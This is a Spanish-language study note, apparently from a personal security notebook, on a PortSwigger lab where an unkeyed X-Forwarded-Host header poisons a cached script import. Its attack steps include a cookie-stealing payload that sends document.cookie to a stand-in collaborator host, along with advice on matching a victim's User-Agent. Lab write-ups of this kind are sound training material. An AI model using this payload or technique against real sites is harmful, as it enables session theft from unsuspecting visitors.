---
aliases:
  - WCP 002 - X-Forwarded-Host controla un script src
  - cache poisoning import attacker js
tags:
  - vuln/web-cache-poisoning
  - example
  - portswigger
---

# 002 — `X-Forwarded-Host` controla el host de un `<script src>`

> Lab: [Unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header) · **Practitioner** · técnica → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]]

## Qué muestra
El caso **canónico** de WCP: la app arma la URL de un **import de JavaScript** usando `X-Forwarded-Host`. Como ese header es **unkeyed**, apuntás el import a **tu exploit server** y la home envenenada carga **tu JS** para todo visitante.

## Request → Response

> `GET / HTTP/1.1`
> `Host: innocent-website.com`
> `X-Forwarded-Host: `==`evil-user.net`==
> `User-Agent: Mozilla/5.0 Firefox/57.0`

**⬇️ se incrusta en el `src` del import:**

> `HTTP/1.1 200 OK`
> `<script src="https://`==`evil-user.net`==`/static/analytics.js"></script>`

## Por qué funciona
- La app **confía en `X-Forwarded-Host`** para generar el hostname de sus recursos (típico detrás de CDN/proxy) → vos decidís el host.
- El header **no entra en la cache key** → la respuesta con `src="https://evil-user.net/..."` se **cachea** y se reparte.
- El **path del import se conserva** (`/static/analytics.js`) → tenés que servir tu JS en **ese mismo path** en tu server.

## Cómo explotarlo (weaponize)
1. En tu **exploit server**, creá el archivo en el path exacto que pide la respuesta:
   - Ruta: `/static/analytics.js`
   - Body (solve): `alert(document.cookie)`
   - Body (real): `new Image().src='//TU-collab/?c='+document.cookie;`
2. Enviá `GET /` con `X-Forwarded-Host: TU-exploit-server` (sin cache buster, ya listo) → la home queda cacheada importando tu JS.
3. Toda víctima (o el **admin**) que abra `/` ejecuta tu script → te llega su cookie.

## Verificación
- `GET /` **sin** el header → la respuesta ya trae `<script src="https://TU-exploit-server/static/analytics.js">` con `X-Cache: hit`.
- En el **Access log** del exploit server ves los hits al `/static/analytics.js`.

## Detalles que se pasan por alto
- **El `User-Agent` importa en la variante "dirigida"** → en el lab [Targeted, unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header) la cache key **incluye el `User-Agent`**: para envenenar la copia que recibirá **una víctima concreta**, tenés que **replicar su User-Agent** (te lo filtra un comentario/exploit server) y el header secreto lo hallás con **Param Miner**.
- **Un header solo alcanza acá**; si la app exige además el esquema, es el caso de [[vulnerabilities/030-web-cache-poisoning/examples/003-multiples-headers|003 (múltiples headers)]].
- Serví el JS con `Content-Type: application/javascript` para que el browser lo ejecute.

→ Siguiente: [[vulnerabilities/030-web-cache-poisoning/examples/003-multiples-headers|003 · Múltiples headers]]
